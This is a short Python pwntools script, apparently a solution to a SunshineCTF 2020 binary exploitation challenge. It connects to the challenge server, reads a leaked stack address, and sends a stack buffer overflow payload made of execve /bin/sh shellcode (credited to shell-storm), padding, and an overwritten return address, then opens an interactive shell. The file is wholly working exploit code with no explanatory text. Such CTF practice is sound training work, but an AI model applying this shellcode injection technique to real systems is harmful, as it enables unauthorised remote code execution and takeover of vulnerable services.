# RazviOverflow
# Python3

from pwn import *

# Shellcode from http://shell-storm.org/shellcode/files/shellcode-806.php

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#binary = process("./chall_03")
binary = remote("chal.2020.sunshinectf.org", 30003)

print(binary.recv())
binary.sendline()
# I'll make it: 0x7ffc814056f0
address_of_stack = binary.recv()
address_of_stack = binary.recv()
print(address_of_stack)
address_of_stack = p64(int(str(address_of_stack).split(":")[1].strip()[:-3], 16))

print(address_of_stack)
print(len(shellcode))

binary.sendline(shellcode + b"A"*(0x70-len(shellcode)) + b"B"*0x08 + address_of_stack)
binary.interactive()
